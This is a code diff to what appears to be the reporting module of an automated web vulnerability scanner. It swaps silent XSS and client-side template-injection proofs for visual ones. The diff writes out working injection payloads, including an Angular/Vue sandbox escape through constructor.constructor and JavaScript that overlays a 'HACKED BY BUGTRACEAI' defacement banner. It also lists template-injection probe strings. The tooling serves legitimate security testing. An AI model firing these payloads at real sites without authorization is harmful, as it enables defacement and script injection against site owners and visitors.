@@ -207,13 +207,23 @@ def has_minimum_evidence(finding: Dict) -> bool:
 # visually impactful equivalents so report quality is always premium.
 
 _VISUAL_BANNER_JS = (
-    "var d=document.createElement(`div`);"
+    "(function(d){"
+    "d.id=`bt-pwn`;"
     "d.setAttribute(`style`,`position:fixed;top:0;left:0;width:100%;"
-    "background:red;color:white;text-align:center;padding:20px;"
-    "font-size:24px;font-weight:bold;z-index:99999`);"
-    "d.innerText=`HACKED BY BUGTRACEAI`;"
-    "document.body.prepend(d)"
+    "box-sizing:border-box;background:red;color:white;text-align:center;"
+    "padding:20px;font-size:24px;font-weight:bold;opacity:1;filter:none;"
+    "transform:none;visibility:visible;display:block;z-index:2147483647`);"
+    "d.innerText=`HACKED\\x20BY\\x20BUGTRACEAI`;"
+    "document.documentElement.append(d)"
+    "})(document.createElement(`div`))"
 )
+
+# Rendered banner text (what the victim's browser actually shows once the `\x20`
+# escapes are evaluated) and its whitespace-free source spelling. Both are checked
+# when deciding whether a payload is ALREADY visual, so neither a scan-time visual
+# payload (plain spaces) nor a report-time upgraded one (escaped) is upgraded twice.
+_VISUAL_BANNER_TEXT = "HACKED BY BUGTRACEAI"
+_VISUAL_BANNER_TEXT_ESCAPED = _VISUAL_BANNER_TEXT.replace(" ", "\\x20")
 
 # Map: silent payload → visual payload (exact match)
 _PAYLOAD_UPGRADE_MAP = {
@@ -245,21 +255,49 @@ _PAYLOAD_UPGRADE_MAP = {
         "\\\\\";" + "{" + _VISUAL_BANNER_JS + "};//",
 }
 
-# CSTI silent payloads → visual equivalents
+#
+# Keys are the ARITHMETIC PROBES THE AGENT ACTUALLY SENDS. The map used to hold only
+# `{{7*7}}`/`{{7*'7'}}` while CSTIAgent has shipped `{{1000003*1000003}}` since 3.6.17
+# (7*7=49 collides with real page content; the long product does not), so no CSTI
+# finding could ever match and the whole CSTI branch was dead.
+#
+# Only `{{ }}` forms appear here on purpose. The banner escapes an Angular/Vue sandbox
+# via constructor.constructor; substituting it for a `${...}`, `<%= %>`, `#{...}` or
+# `[[...]]` probe would hand the reader a PoC that cannot fire on the engine that was
+# actually exploited. Those keep their arithmetic proof instead.
+#
+# Built from the shared _VISUAL_BANNER_JS instead of a third hand-copied literal: the
+# CSTI map carried its own older copy of the banner, so CSTI and XSS proved impact with
+# different JS and only one of them was ever screenshot-validated.
+_CSTI_VISUAL_BANNER = "{{constructor.constructor('" + _VISUAL_BANNER_JS + "')()}}"
+
 _CSTI_UPGRADE_MAP = {
-    "{{7*7}}": "{{constructor.constructor('var d=document.createElement(\"div\");d.style=\"position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999\";d.innerText=\"HACKED BY BUGTRACEAI\";document.body.prepend(d)')()}}",
-    "{{7*'7'}}": "{{constructor.constructor('var d=document.createElement(\"div\");d.style=\"position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999\";d.innerText=\"HACKED BY BUGTRACEAI\";document.body.prepend(d)')()}}",
+    "{{1000003*1000003}}": _CSTI_VISUAL_BANNER,
+    "{{ 1000003*1000003 }}": _CSTI_VISUAL_BANNER,
+    "{{7*7}}": _CSTI_VISUAL_BANNER,
+    "{{7*'7'}}": _CSTI_VISUAL_BANNER,
 }
 
 
 # PURE
-def upgrade_payload(payload: str, vuln_type: str) -> Optional[str]:
+def upgrade_payload(
+    payload: str,
+    vuln_type: str,
+    engine_type: Optional[str] = None,
+) -> Optional[str]:
     """Return the visual-PoC upgrade of a silent payload, or None if none applies.
 
     Single source of truth for the silent → visual "HACKED BY BUGTRACEAI" transform,
     shared by the reporting upgrade pass (`upgrade_finding_payloads`) and the XSS
     proof-screenshot capture (`XSSAgentV4._capture_proof_screenshot`). Keeping it
     here — next to the maps — avoids a second copy of the transform in the agent.
+
+    `engine_type` is the template-injection discriminator. CSTIAgent labels EVERY
+    template finding `type: "CSTI"` — server-side Jinja2 included — and records the
+    real distinction in `engine_type`, so vuln_type alone cannot tell a browser-side
+    engine from a server-side one. The banner is a client-side sandbox escape: on a
+    server-side engine it renders nothing, so a server-side finding keeps the
+    arithmetic proof that was actually observed rather than a PoC that cannot fire.
     """
     if not payload:
         return None
@@ -268,6 +306,8 @@ def upgrade_payload(payload: str, vuln_type: str) -> Optional[str]:
     if vt in ("XSS", "DOM-XSS", "REFLECTED_XSS", "STORED_XSS"):
         upgrade_map = _PAYLOAD_UPGRADE_MAP
     elif vt in ("CSTI", "SSTI"):
+        if "server" in (engine_type or "").lower():
+            return None
         upgrade_map = _CSTI_UPGRADE_MAP
     else:
         return None
@@ -278,7 +318,10 @@ def upgrade_payload(payload: str, vuln_type: str) -> Optional[str]:
     # Substring fallback (e.g. an LLM-built payload wrapping document.title=..., or
     # a confirmed XSS proven via an alert() canary).
     if not new_payload:
-        if vt in ("XSS", "DOM-XSS", "REFLECTED_XSS", "STORED_XSS") and "HACKED BY BUGTRACEAI" not in payload:
+        already_visual = (
+            _VISUAL_BANNER_TEXT in payload or _VISUAL_BANNER_TEXT_ESCAPED in payload
+        )
+        if vt in ("XSS", "DOM-XSS", "REFLECTED_XSS", "STORED_XSS") and not already_visual:
             banner_block = "{" + _VISUAL_BANNER_JS + "}"
             if "document.title=document.domain" in payload:
                 new_payload = payload.replace("document.title=document.domain", banner_block)
@@ -323,7 +366,7 @@ def upgrade_finding_payloads(findings: List[Dict]) -> List[Dict]:
         if not payload:
             continue
 
-        new_payload = upgrade_payload(payload, vuln_type)
+        new_payload = upgrade_payload(payload, vuln_type, finding.get("engine_type"))
 
         if new_payload and new_payload != payload:
             # Preserve original for traceability
